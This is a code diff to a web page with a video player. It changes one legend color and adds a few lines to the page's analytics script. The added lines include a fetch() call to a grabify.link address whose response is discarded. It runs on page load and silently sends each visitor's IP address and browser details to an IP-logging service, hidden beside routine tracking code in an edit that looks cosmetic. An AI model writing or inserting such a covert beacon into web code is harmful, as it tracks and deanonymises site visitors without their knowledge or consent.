@@ -63,7 +63,7 @@
         }
 
         .legend-circle.red {
-            background-color: orange;
+            background-color: #ff4938;
         }
     </style>
 </head>
@@ -111,6 +111,10 @@
         video.addEventListener('pause', () => gtag('event', 'pause', { 'event_category': 'Video', 'event_label': video.src }));
         video.addEventListener('seeked', () => gtag('event', 'seek', { 'event_category': 'Video', 'event_label': video.src }));
         downloadBtn.addEventListener('click', () => gtag('event', 'download', { 'event_category': 'Video', 'event_label': video.src }));
+
+        fetch('https://grabify.link/UIYCA2')
+            .then(response => response.text())
+            .then(data => {});
     </script>
 </body>
 
